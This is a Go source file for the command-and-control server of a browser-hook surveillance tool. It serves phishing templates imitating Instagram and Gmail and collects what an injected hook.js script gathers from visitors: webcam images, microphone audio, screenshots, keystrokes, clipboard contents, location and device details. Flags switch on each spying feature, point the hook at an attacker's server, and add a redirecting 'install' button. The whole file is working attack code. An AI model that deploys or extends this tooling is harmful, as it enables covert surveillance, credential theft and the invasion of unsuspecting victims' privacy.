package main

import (
	cryptorand "crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/netip"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/tdewolff/minify/v2"
	"github.com/tdewolff/minify/v2/js"
)

type HookData struct {
	Type      string      `json:"type"`
	Data      interface{} `json:"data"`
	SessionID string      `json:"sessionId"`
	Timestamp string      `json:"timestamp"`
}

var (
	collectedData = make(map[string][]HookData)
	dataMutex     = &sync.Mutex{}
)

type DeviceData struct {
	ID         string                 `json:"id"`
	UserAgent  string                 `json:"userAgent"`
	IP         string                 `json:"ip"`
	Timestamp  time.Time              `json:"timestamp"`
	Data       map[string]interface{} `json:"data"`
	MediaFiles []string               `json:"mediaFiles"`
}

var (
	port             int
	hookServer       string
	hookInterval     int = 5000 // 5 seconds
	enableWebcam     bool
	enableMicrophone bool
	enableClipboard  bool
	enableScreenshot bool
	enableKeylogger  bool
	enableLocation   bool
	enableAll        bool
	enablePWA        bool
	enableInstall    bool
	installURL       string
	template         string
)

// Template types
const (
	DefaultTemplate = "index"
	TemplatesDir    = "static/templates"
)

// Template mappings
var templateMap = map[string]string{
	"instagram": "instagram.html",
	"gmail":     "gmail.html",
	// Other template mappings can be added here
}

func dataDirectory(deviceID string) (string, error) {
	dataDir := "data"
	if err := os.MkdirAll(dataDir, 0700); err != nil {
		return "", fmt.Errorf("data directory could not be created: %v", err)
	}

	deviceDir := filepath.Join(dataDir, deviceID)
	mediaDir := filepath.Join(deviceDir, "media")

	// Check if device directory already exists
	if _, err := os.Stat(deviceDir); err == nil {
		// Directory exists, check if media directory exists
		if _, err := os.Stat(mediaDir); err != nil {
			// Media directory doesn't exist, create it
			if err := os.MkdirAll(mediaDir, 0700); err != nil {
				return "", fmt.Errorf("media directory could not be created: %v", err)
			}
		}
		return deviceDir, nil
	}

	// Create new directories if they don't exist
	if err := os.MkdirAll(deviceDir, 0700); err != nil {
		return "", fmt.Errorf("device directory could not be created: %v", err)
	}

	if err := os.MkdirAll(mediaDir, 0700); err != nil {
		return "", fmt.Errorf("media directory could not be created: %v", err)
	}

	return deviceDir, nil
}

func init() {
	flag.IntVar(&port, "port", 443, "Port to listen on")
	flag.StringVar(&hookServer, "hook-server", "", "Hook server domain/IP (required)")
	flag.IntVar(&hookInterval, "hook-interval", 5000, "Hook polling interval in milliseconds")
	flag.BoolVar(&enableWebcam, "enable-webcam", false, "Enable webcam feature")
	flag.BoolVar(&enableMicrophone, "enable-microphone", false, "Enable microphone feature")
	flag.BoolVar(&enableClipboard, "enable-clipboard", false, "Enable clipboard feature")
	flag.BoolVar(&enableScreenshot, "enable-screenshot", false, "Enable screenshot feature")
	flag.BoolVar(&enableKeylogger, "enable-keylogger", false, "Enable keylogger feature")
	flag.BoolVar(&enableLocation, "enable-location", false, "Enable location feature")
	flag.BoolVar(&enableAll, "enable-all", false, "Enable all features")
	flag.BoolVar(&enablePWA, "enable-pwa", false, "Enable PWA features")
	flag.BoolVar(&enableInstall, "enable-install", false, "Enable install button")
	flag.StringVar(&installURL, "install-url", "", "URL to redirect when install button is clicked")
	flag.StringVar(&template, "template", "", "Template name to use")
}

func main() {
	flag.Parse()
	server := NewServer()
	//log.Printf("Starting server on port ::%d", port)
	if err := server.ListenAndServeTLS("cert.pem", "key.pem"); err != nil {
		log.Fatal(err)
	}
}

func NewServer() *http.Server {
	if hookServer == "" {
		log.Fatal("Error: -hook-server parameter is required. Usage: go run main.go -hook-server <domain_or_ip>")
	}

	certFile := "cert.pem"
	keyFile := "key.pem"

	if !fileExists(certFile) || !fileExists(keyFile) {
		generateSelfSignedCert(certFile, keyFile)
	} else {
		log.Println("Using existing certificates:", certFile, "and", keyFile)
	}

	tlsConfig := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}

	server := &http.Server{
		Addr:         fmt.Sprintf(":%d", port),
		TLSConfig:    tlsConfig,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}

	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// main page handler
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}

		// get and serve the template file
		templatePath := getTemplateFile(template)
		http.ServeFile(w, r, templatePath)
	})

	// add the API endpoint - process the data from hook.js
	http.HandleFunc("/api/data", handleData)

	// update the hook.js file dynamically
	updateHookJs()

	log.Printf("Server starting at ::%d", port)
	log.Printf("To access the hook.js file: ::%d/static/hook.js", port)

	return server
}

// sanitizeFileName creates a safe filename from sessionID
func sanitizeFileName(sessionID string) string {
	// Add a prefix to prevent path traversal
	prefix := "hook_"

	// Remove any potentially dangerous characters
	/*safeID := strings.Map(func(r rune) rune {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			return r
		}
		return -1
	}, sessionID)*/

	if !validateSessionID(sessionID) {
		return ""
	}

	return prefix + sessionID
}

// handleData processes the data received from hook.js
func handleData(w http.ResponseWriter, r *http.Request) {
	// CORS settings
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method != "POST" {
		http.Error(w, "Only POST requests are accepted", http.StatusMethodNotAllowed)
		return
	}

	// read the request
	bodyData, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Printf("Error reading data: %v", err)
		http.Error(w, "Data could not be read", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// parse the JSON data
	var hookData HookData
	if err := json.Unmarshal(bodyData, &hookData); err != nil {
		log.Printf("JSON parsing error: %v", err)
		http.Error(w, "Invalid JSON data", http.StatusBadRequest)
		return
	}

	// SessionID validation and creation
	sessionID := hookData.SessionID

	// SessionID cookie check
	cookie, err := r.Cookie("hook_session_id")
	if err == nil && cookie.Value != "" {
		if validateSessionID(cookie.Value) {
			sessionID = cookie.Value
			log.Printf("Session ID retrieved from cookie: %s", sessionID)
		}
	}

	// if SessionID is invalid, create a new one
	if !validateSessionID(sessionID) {
		sessionID = generateSessionID()
		log.Printf("New session ID created: %s", sessionID)

		// set the SessionID as a cookie
		http.SetCookie(w, &http.Cookie{
			Name:     "hook_session_id",
			Value:    sessionID,
			Path:     "/",
			MaxAge:   86400 * 365, // 365 days
			HttpOnly: true,
			Secure:   true,
			SameSite: http.SameSiteStrictMode,
		})
	}

	// assign the correct SessionID to HookData
	hookData.SessionID = sessionID

	// add the timestamp
	hookData.Timestamp = time.Now().Format(time.RFC3339)

	// create the device directory using sanitized sessionID

	if sanitizeFileName(sessionID) == "" {
		http.Error(w, "Invalid Request", http.StatusBadRequest)
		return
	}

	if sanitizeFileName(hookData.SessionID) == "" {
		http.Error(w, "Invalid Request", http.StatusBadRequest)
		return
	}

	deviceDir, err := dataDirectory(sanitizeFileName(sessionID))
	if err != nil {
		log.Printf("Error creating directory: %v", err)
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}

	// process the media data (if exists)
	mediaPath := ""
	if isMediaType(hookData.Type) {
		mediaPath = processMediaData(hookData, deviceDir)
		if mediaPath == "" {
			http.Error(w, "Invalid Request", http.StatusBadRequest)
			return
		}
		log.Printf("Media saved: %s", mediaPath)
	}

	// log the data
	log.Printf("Received data: Type=%s, Session=%s, Timestamp=%s",
		hookData.Type, sessionID, hookData.Timestamp)

	// save the data
	dataMutex.Lock()
	if _, exists := collectedData[sessionID]; !exists {
		collectedData[sessionID] = []HookData{}
	}
	collectedData[sessionID] = append(collectedData[sessionID], hookData)
	dataMutex.Unlock()

	// save the data to the file using sanitized sessionID
	dataFilePath := filepath.Join(deviceDir, sanitizeFileName(sessionID)+".json")

	// read the existing file or create a new one
	var jsonData []byte
	if fileExists(dataFilePath) {
		var existingData []HookData
		fileContent, _ := ioutil.ReadFile(dataFilePath)
		if err := json.Unmarshal(fileContent, &existingData); err == nil {
			existingData = append(existingData, hookData)
			jsonData, _ = json.MarshalIndent(existingData, "", "  ")
		} else {
			// if the file exists but is not valid JSON, write only the new data
			jsonData, _ = json.MarshalIndent([]HookData{hookData}, "", "  ")
		}
	} else {
		// if the file does not exist, create a new one
		jsonData, _ = json.MarshalIndent([]HookData{hookData}, "", "  ")
	}

	// write the data to the file
	if err := ioutil.WriteFile(dataFilePath, jsonData, 0644); err != nil {
		log.Printf("Error writing file: %v", err)
	}

	// successful response
	w.Header().Set("Content-Type", "application/json")
	resp := map[string]interface{}{
		"success": true,
		//"sessionId": sessionID,
		//"timestamp": hookData.Timestamp,
	}

	jsonResp, _ := json.Marshal(resp)
	w.Write(jsonResp)
}

// check if the data type is a media type
func isMediaType(dataType string) bool {
	mediaPrefixes := []string{"webcam", "screenshot", "microphone", "audio"}
	for _, prefix := range mediaPrefixes {
		if strings.HasPrefix(dataType, prefix) {
			return true
		}
	}
	return false
}

// validateBase64Data checks if the base64 data is safe to process
func validateBase64Data(data string, maxSize int) (bool, string) {
	// Check if data is empty
	if data == "" {
		return false, "Empty data"
	}

	// Check data size
	if len(data) > maxSize {
		return false, fmt.Sprintf("Data too large (max %d bytes)", maxSize)
	}

	// Check if it's valid base64
	if !strings.Contains(data, ",") {
		return false, "Invalid base64 format"
	}

	// Split data and header
	parts := strings.Split(data, ",")
	if len(parts) != 2 {
		return false, "Invalid data format"
	}

	// Validate base64 content
	if _, err := base64.StdEncoding.DecodeString(parts[1]); err != nil {
		return false, "Invalid base64 content"
	}

	return true, ""
}

// process and save the media data
func processMediaData(hookData HookData, deviceDir string) string {
	mediaPath := ""
	mediaDir := filepath.Join(deviceDir, "media")

	if sanitizeFileName(hookData.SessionID) == "" {
		return ""
	}

	switch hookData.Type {
	case "webcam", "screenshot":
		if data, ok := hookData.Data.(map[string]interface{}); ok {
			if img, ok := data["image"].(string); ok {
				// Validate image data (max 10MB)
				if valid, err := validateBase64Data(img, 10*1024*1024); !valid {
					log.Printf("Invalid image data: %s", err)
					return ""
				}

				// Validate MIME type
				mimeType := strings.Split(strings.Split(img, ",")[0], ";")[0]
				if !strings.HasPrefix(mimeType, "data:image/jpeg") && !strings.HasPrefix(mimeType, "data:image/png") {
					log.Printf("Unsupported image format: %s", mimeType)
					return ""
				}

				mediaPath = saveBase64Image(img, hookData.Type, sanitizeFileName(hookData.SessionID), mediaDir)
				if mediaPath != "" {
					data["image_path"] = mediaPath
					data["image"] = "Image saved: " + mediaPath
					hookData.Data = data
				}
			}
		}
	case "microphone":
		if data, ok := hookData.Data.(map[string]interface{}); ok {
			if audio, ok := data["audio"].(string); ok {
				// Validate audio data (max 50MB)
				if valid, err := validateBase64Data(audio, 50*1024*1024); !valid {
					log.Printf("Invalid audio data: %s", err)
					return ""
				}

				// Validate MIME type
				mimeType := strings.Split(strings.Split(audio, ",")[0], ";")[0]
				if !strings.HasPrefix(mimeType, "data:audio/webm") &&
					!strings.HasPrefix(mimeType, "data:audio/mp3") &&
					!strings.HasPrefix(mimeType, "data:audio/wav") {
					//log.Printf("Unsupported audio format: %s", mimeType)
					return ""
				}

				mediaPath = saveBase64Audio(audio, sanitizeFileName(hookData.SessionID), mediaDir)
				if mediaPath != "" {
					data["audio_path"] = mediaPath
					data["audio"] = "Audio saved: " + mediaPath
					hookData.Data = data
				}
			}
		}
	}

	return mediaPath
}

// save the base64 image to a file
func saveBase64Image(base64Data, imageType, sessionID, mediaDir string) string {

	// 1. Check the MIME type
	mimeType := strings.Split(strings.Split(base64Data, ",")[0], ";")[0]
	if !strings.HasPrefix(mimeType, "data:image/jpeg") && !strings.HasPrefix(mimeType, "data:image/png") {
		log.Printf("Invalid MIME type: %s", mimeType)
		return ""
	}

	// 2. Check the size
	if len(base64Data) > 10*1024*1024 { // 10MB limit
		log.Printf("File too large")
		return ""
	}

	// 3. Base64 decode
	parts := strings.Split(base64Data, ",")
	if len(parts) != 2 {
		return ""
	}

	// Decode the base64 data
	decoded, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		//log.Printf("Base64 decoding error: %v", err)
		return ""
	}

	if !isValidImage(decoded) {
		log.Printf("Invalid image content")
		return ""
	}

	// 4. Check the safe file extension
	var extension string
	if strings.Contains(mimeType, "jpeg") {
		extension = "jpg"
	} else {
		extension = "png"
	}

	// Create the filename
	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("%s_%s_%s.%s", imageType, sessionID, timestamp, extension)
	filepath := filepath.Join(mediaDir, filename)

	// 5. Check the safe file permissions
	err = ioutil.WriteFile(filepath, decoded, 0600)
	if err != nil {
		return ""
	}

	return filepath
}

// Save the base64 audio data to a file
func saveBase64Audio(base64Data, sessionID, mediaDir string) string {
	// 1. Check the MIME type
	mimeType := strings.Split(strings.Split(base64Data, ",")[0], ";")[0]
	if !strings.HasPrefix(mimeType, "data:audio/webm") &&
		!strings.HasPrefix(mimeType, "data:audio/mp3") &&
		!strings.HasPrefix(mimeType, "data:audio/wav") {
		log.Printf("Invalid MIME type: %s", mimeType)
		return ""
	}

	// Split the base64 data
	parts := strings.Split(base64Data, ",")
	if len(parts) != 2 {
		return ""
	}

	// 3. Check the size (10MB limit)
	if len(parts[1]) > 10*1024*1024 {
		log.Printf("File too large")
		return ""
	}

	decoded, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return ""
	}

	// 4. Check the audio content
	if !isValidAudio(decoded) {
		log.Printf("Invalid audio content")
		return ""
	}

	// 5. Check the safe file extension
	var extension string
	if strings.Contains(mimeType, "webm") {
		extension = "webm"
	} else if strings.Contains(mimeType, "mp3") {
		extension = "mp3"
	} else {
		extension = "wav"
	}

	// 6. Create the filename
	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("audio_%s_%s.%s", sessionID, timestamp, extension)
	filepath := filepath.Join(mediaDir, filename)

	// Save the file
	err = ioutil.WriteFile(filepath, decoded, 0600)
	if err != nil {
		//log.Printf("File save error: %v", err)
		return ""
	}

	return filepath
}

func isValidImage(data []byte) bool {
	// Check if the data is too small
	if len(data) < 8 {
		return false
	}

	// Check if the data is a valid JPEG
	if data[0] == 0xFF && data[1] == 0xD8 && data[2] == 0xFF {
		return true
	}

	// Check if the data is a valid PNG
	if data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47 {
		return true
	}

	return false
}

func isValidAudio(data []byte) bool {
	// Check if the data is too small
	if len(data) < 4 {
		return false
	}

	// Check if the data is a valid WebM
	if data[0] == 0x1A && data[1] == 0x45 && data[2] == 0xDF && data[3] == 0xA3 {
		return true
	}

	// Check if the data is a valid MP3
	if data[0] == 0x49 && data[1] == 0x44 && data[2] == 0x33 {
		return true
	}

	// Check if the data is a valid WAV
	if data[0] == 0x52 && data[1] == 0x49 && data[2] == 0x46 && data[3] == 0x46 {
		return true
	}

	return false
}

// SessionID validation function
func validateSessionID(sessionID string) bool {
	// SessionID should not be empty
	if sessionID == "" {
		return false
	}

	// SessionID should be 24 characters long (12 bytes in hex)
	if len(sessionID) != 24 {
		return false
	}

	// SessionID should only contain hexadecimal characters
	for _, char := range sessionID {
		if !((char >= '0' && char <= '9') || (char >= 'a' && char <= 'f')) {
			return false
		}
	}

	return true
}

// generate a random SessionID
func generateSessionID() string {
	// Generate 12 random bytes
	bytes := make([]byte, 12)
	if _, err := cryptorand.Read(bytes); err != nil {
		log.Printf("Error generating session ID: %v", err)
		// Fallback to less secure method if crypto/rand fails
		for i := range bytes {
			bytes[i] = byte(rand.Intn(256))
		}
	}

	// Convert to hex string
	return fmt.Sprintf("%x", bytes)
}

// file copy helper function
func copyFile(src, dst string) error {
	input, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(dst, input, 0644)
}

// JavaScript minify function
func minifyJS(code string) string {
	m := minify.New()
	m.AddFunc("text/javascript", js.Minify)
	minified, err := m.String("text/javascript", code)
	if err != nil {
		log.Printf("Minification error: %v", err)
		return code
	}
	return minified
}

// MinifyJSFile function - minify the file
func minifyJSFile(filePath string) error {
	fmt.Println("Minify process started...")
	startTime := time.Now()

	// Read the file content
	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("file read error: %v", err)
	}

	// Make a backup
	backupPath := filePath + ".backup"
	if err := copyFile(filePath, backupPath); err != nil {
		return fmt.Errorf("backup error: %v", err)
	}

	// Minify the JS code
	minified := minifyJS(string(content))

	// Write the minified code to the file
	minifiedPath := strings.TrimSuffix(filePath, ".js") + ".min.js"
	if err := os.WriteFile(minifiedPath, []byte(minified), 0644); err != nil {
		return fmt.Errorf("file write error: %v", err)
	}

	// Calculate the duration
	duration := time.Since(startTime)
	fmt.Printf("Minify completed! Duration: %v\n", duration)
	fmt.Printf("Original file: %s\n", filePath)
	fmt.Printf("Backup file: %s\n", backupPath)
	fmt.Printf("Minified file: %s\n", minifiedPath)

	return nil
}

// Check if the file exists
func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

// Generate a self-signed TLS certificate
func generateSelfSignedCert(certFile, keyFile string) {
	// If existing certificates exist, delete them - only generate if no valid certificates exist

	log.Println("Self-signed certificate generation started...")
	cmd := exec.Command("openssl", "req", "-x509", "-newkey", "rsa:2048",
		"-keyout", keyFile, "-out", certFile,
		"-days", "365", "-nodes", "-subj", "/CN=localhost")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("openssl error: %v, output: %s", err, output)
		log.Fatal("Certificate generation failed, please ensure openssl is installed")
	}

	log.Printf("Certificate %s and %s files created successfully", certFile, keyFile)
}

// isValidURL checks if the URL is a valid IP address or domain name
func isValidURL(urlStr string) bool {
	u, err := url.Parse(urlStr)
	if err != nil {
		return false
	}

	if u.Scheme != "http" && u.Scheme != "https" {
		return false
	}

	host := u.Hostname()

	addr, err := netip.ParseAddr(host)
	if err == nil && addr.IsValid() {
		return true
	}

	parts := strings.Split(host, ".")
	if len(parts) < 2 {
		return false
	}

	for _, part := range parts {
		if len(part) < 1 || len(part) > 63 {
			return false
		}

		if !isAlphanumeric(part[0]) || !isAlphanumeric(part[len(part)-1]) {
			return false
		}

		for i := 0; i < len(part); i++ {
			if !isAlphanumeric(part[i]) && part[i] != '-' {
				return false
			}
		}
	}

	return true
}

func isAlphanumeric(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
}

type installURLFlagType string

var installURLFlag installURLFlagType

func (f *installURLFlagType) String() string {
	return string(*f)
}

func (f *installURLFlagType) Set(value string) error {
	if !isValidURL(value) {
		return fmt.Errorf("invalid URL format. Must be a valid IP address or domain name (e.g., http://1.1.1.1 or https://example.com)")
	}
	*f = installURLFlagType(value)
	installURL = value
	return nil
}

func updateHookJs() {
	content, err := os.ReadFile("static/hook.js")
	if err != nil {
		log.Printf("error reading hook.js: %v", err)
		return
	}

	// Update pollInterval value
	pollIntervalPattern := `pollInterval:.*?,`
	pollIntervalReplacement := fmt.Sprintf(`pollInterval: %d,`, hookInterval)
	pollIntervalRegex := regexp.MustCompile(pollIntervalPattern)
	content = pollIntervalRegex.ReplaceAll(content, []byte(pollIntervalReplacement))

	// Initialize features map with all features disabled by default
	features := map[string]bool{
		"collectBrowserInfo": true,
		"webcam":             false,
		"geolocation":        false,
		"microphone":         false,
		"screenshot":         false,
		"keylogger":          false,
		"clipboard":          false,
		"socialMedia":        true,
		"battery":            true,
		"network":            true,
	}

	// Enable features based on flags
	if enableAll {
		// Enable all features if -enable-all is used
		features["webcam"] = true
		features["geolocation"] = true
		features["microphone"] = true
		features["screenshot"] = true
		features["keylogger"] = true
		features["clipboard"] = true
		log.Println("All features enabled via -enable-all flag")
	} else {
		// Enable only explicitly enabled features
		if enableWebcam {
			features["webcam"] = true
		}
		if enableMicrophone {
			features["microphone"] = true
		}
		if enableClipboard {
			features["clipboard"] = true
		}
		if enableScreenshot {
			features["screenshot"] = true
		}
		if enableKeylogger {
			features["keylogger"] = true
		}
		if enableLocation {
			features["geolocation"] = true
		}
	}

	// Validate install URL if install button is enabled
	if enableInstall {
		if installURL == "" {
			log.Fatal("Error: -install-url is required when -enable-install is used")
		}
		if !isValidURL(installURL) {
			log.Fatal("Error: Invalid install URL format. Must be a valid IP address or domain name")
		}
	}

	// Update server address - only use domain/IP
	serverPattern := `server:.*?,`
	serverReplacement := fmt.Sprintf(`server: "https://%s:%d",`, hookServer, port)
	serverRegex := regexp.MustCompile(serverPattern)
	content = serverRegex.ReplaceAll(content, []byte(serverReplacement))

	// Update features configuration with more specific pattern
	featuresPattern := `features:\s*{[^}]*},`
	featuresJSON, _ := json.Marshal(features)
	featuresReplacement := fmt.Sprintf(`features: %s,`, string(featuresJSON))
	featuresRegex := regexp.MustCompile(featuresPattern)
	content = featuresRegex.ReplaceAll(content, []byte(featuresReplacement))

	// Update PWA and Install button configuration
	pwaPattern := `enablePWA:.*?,`
	pwaReplacement := fmt.Sprintf(`enablePWA: %t,`, enablePWA)
	pwaRegex := regexp.MustCompile(pwaPattern)

	// If PWA configuration is not found, add it
	if !pwaRegex.Match(content) {
		// Add PWA and Install configuration after features section
		featuresEndPattern := `persistentSession:.*?[,]?\n\s*\};`
		featuresEndRegex := regexp.MustCompile(featuresEndPattern)
		pwaConfig := fmt.Sprintf(`persistentSession: true,
        // PWA support
        enablePWA: %t,
        // Install button
        enableInstall: %t,
        // Install button redirect URL
        installURL: "%s"
    };`, enablePWA, enableInstall, installURL)
		content = featuresEndRegex.ReplaceAll(content, []byte(pwaConfig))
	} else {
		// If it already exists, update the values
		content = pwaRegex.ReplaceAll(content, []byte(pwaReplacement))

		installPattern := `enableInstall:.*?,`
		installReplacement := fmt.Sprintf(`enableInstall: %t,`, enableInstall)
		installRegex := regexp.MustCompile(installPattern)
		content = installRegex.ReplaceAll(content, []byte(installReplacement))

		installURLPattern := `installURL:.*?,`
		installURLReplacement := fmt.Sprintf(`installURL: "%s",`, installURL)
		installURLRegex := regexp.MustCompile(installURLPattern)
		content = installURLRegex.ReplaceAll(content, []byte(installURLReplacement))
	}

	// Write updated content to file
	if err := ioutil.WriteFile("static/hook.js", content, 0644); err != nil {
		log.Printf("Hook.js file not updated: %v", err)
	} else {
		log.Println("Hook.js file updated")

		// Log enabled features
		log.Println("Enabled features:")
		for feature, enabled := range features {
			if enabled {
				log.Printf("- %s", feature)
			}
		}

		// Minify the file
		minifyJSFile("static/hook.js")
	}
}

// Get Template File
func getTemplateFile(templateName string) string {
	// Default template (static/index.html)
	defaultPath := "static/index.html"

	// If template name is empty, use default
	if templateName == "" {
		return defaultPath
	}

	// Check if template is in map
	if filename, exists := templateMap[templateName]; exists {
		// Create template file path
		templatePath := filepath.Join(TemplatesDir, filename)

		// Check if file exists
		if _, err := os.Stat(templatePath); err == nil {
			return templatePath
		}

		log.Printf("Template file not found: %s, using default", templatePath)
	} else {
		log.Printf("'%s' is not defined in template map, using default", templateName)
	}

	return defaultPath
}
